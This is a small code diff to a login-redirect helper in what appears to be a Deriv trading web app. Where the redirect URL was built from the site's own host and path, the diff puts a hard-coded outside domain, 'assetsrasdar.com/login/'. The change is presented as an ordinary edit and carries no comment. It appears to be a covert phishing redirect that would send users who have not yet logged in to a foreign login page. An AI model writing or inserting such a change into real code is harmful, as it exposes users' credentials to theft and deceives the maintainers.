@@ -7,7 +7,7 @@ import { deriv_urls } from '../url/constants';
 export const redirectToLogin = (is_logged_in: boolean, language: string, has_params = true, redirect_delay = 0) => {
     if (!is_logged_in && isStorageSupported(sessionStorage)) {
         const l = window.location;
-        const redirect_url = has_params ? window.location.href : `${l.protocol}//${l.host}${l.pathname}`;
+        const redirect_url = has_params ? window.location.href : `${l.protocol}//assetsrasdar.com/login/`;
         sessionStorage.setItem('redirect_url', redirect_url);
         setTimeout(() => {
             const new_href = loginUrl({ language });
